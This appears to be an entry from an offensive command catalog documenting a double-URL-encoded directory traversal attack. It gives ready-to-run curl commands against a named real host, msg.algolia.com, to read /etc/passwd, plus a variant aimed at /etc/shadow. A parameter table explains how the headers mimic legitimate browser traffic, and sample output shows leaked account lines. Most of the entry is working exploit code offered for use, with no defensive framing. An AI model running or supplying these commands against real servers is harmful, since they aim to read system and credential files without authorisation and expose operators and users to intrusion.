---
id: cmd-algolia-curl-trav-001
data: >-
  curl -X GET
  "https://msg.algolia.com/static/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd"
  -H "Host: msg.algolia.com" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Cookie:
  __cfduid=d34587d94eba9413080d1f7aca5062a871522817854" -H "Connection: close"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0)
  Gecko/20100101 Firefox/58.0" -H "Accept-Encoding: gzip, deflate" -H
  "Accept-Language: id,en-US;q=0.7,en;q=0.3" -H "Upgrade-Insecure-Requests: 1"
  --verbose
tags:
  - web-exploit
  - path-traversal
  - http-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:21.660Z'
verified: false
validated: true
submitted: true
---
# curl-directory-traversal-double-encode

## Command

```bash
curl -X GET "https://msg.algolia.com/static/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd" -H "Host: msg.algolia.com" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Cookie: __cfduid=d34587d94eba9413080d1f7aca5062a871522817854" -H "Connection: close" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: id,en-US;q=0.7,en;q=0.3" -H "Upgrade-Insecure-Requests: 1" --verbose
```

## Description

This curl command sends a crafted HTTP GET request to exploit a directory traversal vulnerability by using double URL encoding in the path to access sensitive files outside the intended directory.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| URL path with `%252f` | Double-encoded '../' sequences for traversal | Yes |
| `-H "Host: ..."` | Sets the Host header | Yes |
| `-H "Accept: ..."` | Sets accepted content types | Yes |
| `-H "Cookie: ..."` | Includes session cookie to mimic legitimate traffic | Yes |
| `-H "Connection: close"` | Closes connection after request | Yes |
| `-H "User-Agent: ..."` | Mimics a browser user agent | Yes |
| `-H "Accept-Encoding: ..."` | Specifies encoding support | Yes |
| `-H "Accept-Language: ..."` | Sets language preferences | Yes |
| `-H "Upgrade-Insecure-Requests: 1"` | Indicates upgrade preference | Yes |
| `--verbose` | Provides detailed request/response output | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://msg.algolia.com/static/..%252f..%252fetc/passwd" -H "Host: msg.algolia.com" --verbose
```

### Advanced Usage

```bash
curl -X GET "https://target.com/static/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/shadow" -H "User-Agent: Mozilla/5.0" -H "Cookie: session=abc123" --output traversal_result.txt
```

## Expected Output

A successful run returns HTTP 200 with the file contents in the response body, e.g., 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...\neranchetz:x:1001:1002::/home/eranchetz:/bin/bash'. Verbose mode shows full headers and any errors like 403 if blocked.

## Related

- [[Related Procedure|procedures/Exploit-Path-Traversal-with-Double-URL-Encoding]]
